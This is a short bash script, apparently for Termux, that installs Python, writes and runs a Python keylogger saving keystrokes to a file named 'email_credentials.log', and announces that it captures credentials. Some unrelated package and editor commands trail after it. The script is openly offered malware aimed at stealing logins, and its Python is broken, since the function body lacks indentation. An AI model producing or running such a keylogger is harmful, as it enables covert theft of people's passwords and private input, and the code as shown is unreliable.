#!/bin/bash
# Install Python if not already installed
if ! command -v python &> /dev/null; then pkg install -y python; fi
# Create and run the key logger script
cat << EOF > keylogger.py
import keyboard
import time
import os
log_file = "email_credentials.log"
print(f"Key logger started. Capturing keystrokes to {log_file}...")

def on_key_event(e):
with open(log_file, "a") as f:
f.write(e.name + "\n")
if e.event_type == "down":
if e.name == "enter":
print("Enter key pressed!")

keyboard.on_press(on_key_event)
keyboard.wait("enter")
print("Key logger stopped. Check the log file for captured credentials.")
EOF

# Run the script
python keylogger.py
pkg update
pkg upgrade
pkg install git
pkg install nano
python
nano test.py
